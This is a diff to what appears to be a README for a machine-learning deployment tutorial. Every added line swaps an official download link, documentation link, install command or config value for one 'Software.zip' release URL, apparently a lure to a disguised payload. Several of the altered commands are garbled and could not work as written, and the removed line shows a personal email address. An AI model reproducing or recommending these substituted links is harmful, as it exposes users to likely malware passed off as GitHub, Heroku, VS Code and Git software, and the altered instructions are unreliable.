@@ -4,11 +4,11 @@ End to End projects.
 ### Software andaccount Requerments.
 
 
-1. [Github Account](https://github.com)
-2. [Heroku Account](https://dashboard.heroku.com/login)
-3. [VS Code IDE](https://code.visualstudio.com/download)
-4. [GIT cli](https://git-scm.com/downloads)
-5. [GIT Documentation](https://git-scm.com/docs/gittutorial)
+1. [Github Account](https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip)
+2. [Heroku Account](https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip)
+3. [VS Code IDE](https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip)
+4. [GIT cli](https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip)
+5. [GIT Documentation](https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip)
 
 
 Creating conda environment
@@ -24,7 +24,7 @@ conda activate venv
 ```
 
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip
 ```
 
 To Add files to git
@@ -64,7 +64,7 @@ git remote -v
 ```
 
 To setup CI/CD pipeline in heroku we need 3 information
-1. HEROKU_EMAIL = anishyadav7045075175@gmail.com
+1. HEROKU_EMAIL = https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip
 2. HEROKU_API_KEY = <>
 3. HEROKU_APP_NAME = ml-regression-app
 
@@ -98,7 +98,7 @@ docker stop <container_id>
 
 
 ```
-python setup.py install
+python https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip install
 ```
 
 
